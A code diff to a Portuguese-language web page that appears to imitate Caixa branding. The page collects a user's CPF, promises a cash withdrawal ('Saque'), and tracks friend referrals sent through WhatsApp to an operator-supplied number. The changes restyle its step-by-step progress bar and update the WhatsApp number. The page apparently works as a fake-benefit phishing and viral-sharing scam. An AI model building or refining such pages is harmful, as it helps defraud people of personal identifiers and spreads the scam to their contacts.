@@ -204,45 +204,61 @@
       transition: all 0.3s ease;
     }
     .btn-modal-secondary:hover { background: #e9ecef; }
-    
-    .step-indicator {
-      display: flex;
-      justify-content: center;
-      gap: 30px;
-      margin-bottom: 25px;
-      padding: 0 20px;
+
+    /* BARRA DE PROGRESSO ESTILIZADA */
+    .progress-container {
+      padding: 0 10px;
+      margin-bottom: 20px;
     }
-    .step-dot { text-align: center; flex: 1; position: relative; }
-    .step-dot .dot {
+    .progress-steps {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: relative;
+    }
+    .progress-step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      z-index: 2;
+      flex: 1;
+    }
+    .step-icon {
       width: 40px;
       height: 40px;
-      background: #e9ecef;
+      background: rgba(255,255,255,0.3);
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      margin: 0 auto 8px;
       font-weight: bold;
-      color: #6c757d;
+      font-size: 18px;
       transition: all 0.3s ease;
     }
-    .step-dot.active .dot {
-      background: linear-gradient(135deg, #ffb600, #ffa000);
+    .progress-step.active .step-icon {
+      background: var(--caixa-yellow);
       color: #004aad;
-      box-shadow: 0 2px 10px rgba(255,182,0,0.3);
+      box-shadow: 0 0 0 3px rgba(255,182,0,0.3);
     }
-    .step-dot .label { font-size: 12px; color: #6c757d; }
-    .step-dot.active .label { color: #004aad; font-weight: 600; }
-    .step-dot::after {
-      content: '';
-      position: absolute;
-      top: 20px;
-      right: -15px;
-      width: 30px;
-      height: 2px;
-      background: #e9ecef;
+    .step-text {
+      font-size: 11px;
+      margin-top: 8px;
+      opacity: 0.7;
+      text-align: center;
     }
-    .step-dot:last-child::after { display: none; }
+    .progress-step.active .step-text {
+      opacity: 1;
+      font-weight: 600;
+    }
+    .progress-line {
+      flex: 1;
+      height: 3px;
+      background: rgba(255,255,255,0.3);
+      margin: 0 5px;
+      position: relative;
+      top: -15px;
+    }
 
     /* Indicadores de amigo */
     .friend-indicator {
@@ -362,15 +378,29 @@
     </div>
   </footer>
 
-  <!-- MODAL PRINCIPAL -->
+  <!-- MODAL PRINCIPAL COM BARRA DE PROGRESSO -->
   <div class="modal fade" id="flowModal" tabindex="-1" aria-hidden="true">
     <div class="modal-dialog modal-dialog-centered modal-md">
       <div class="modal-content">
         <div class="modal-header-custom">
-          <div class="step-indicator" id="stepIndicator">
-            <div class="step-dot active" data-step="1"><div class="dot">1</div><div class="label">CPF</div></div>
-            <div class="step-dot" data-step="2"><div class="dot">2</div><div class="label">Verificação</div></div>
-            <div class="step-dot" data-step="3"><div class="dot">3</div><div class="label">Valor</div></div>
+          <!-- BARRA DE PROGRESSO ESTILIZADA -->
+          <div class="progress-container">
+            <div class="progress-steps">
+              <div class="progress-step active" data-step="1">
+                <div class="step-icon">1</div>
+                <div class="step-text">CPF</div>
+              </div>
+              <div class="progress-line"></div>
+              <div class="progress-step" data-step="2">
+                <div class="step-icon">2</div>
+                <div class="step-text">Verificação</div>
+              </div>
+              <div class="progress-line"></div>
+              <div class="progress-step" data-step="3">
+                <div class="step-icon">3</div>
+                <div class="step-text">Saque</div>
+              </div>
+            </div>
           </div>
           <button type="button" class="btn-close btn-close-white position-absolute top-0 end-0 m-3" data-bs-dismiss="modal"></button>
         </div>
@@ -555,7 +585,7 @@
     let saqueLiberado = false;
 
     // Número do WhatsApp para envio (SUBSTITUA PELO SEU NÚMERO)
-    const WHATSAPP_NUMBER = "5599999999999"; // Coloque seu número com DDD e país (55)
+    const WHATSAPP_NUMBER = "5511999999999"; // Coloque seu número com DDD e país (55)
 
     function formatarCPF(input) {
       let value = input.value.replace(/\D/g, '');
@@ -590,8 +620,9 @@
       return data.toLocaleDateString('pt-BR');
     }
 
-    function updateStepIndicator(step) {
-      document.querySelectorAll('.step-dot').forEach((el, idx) => {
+    function updateProgressBar(step) {
+      // Atualiza a barra de progresso
+      document.querySelectorAll('.progress-step').forEach((el, idx) => {
         if (idx + 1 <= step) el.classList.add('active');
         else el.classList.remove('active');
       });
@@ -605,7 +636,7 @@
       });
       const target = document.getElementById(stepId);
       if (target) target.classList.add('active');
-      if (stepNumber) updateStepIndicator(stepNumber);
+      if (stepNumber) updateProgressBar(stepNumber);
     }
 
     async function buscarCPF(cpf) {
@@ -720,7 +751,6 @@
         
         enviarWhatsApp(mensagem);
         
-        // Simula indicação após compartilhar
         amigosIndicados++;
         const friendDiv = document.getElementById(`friend${amigosIndicados}`);
         if (friendDiv) {
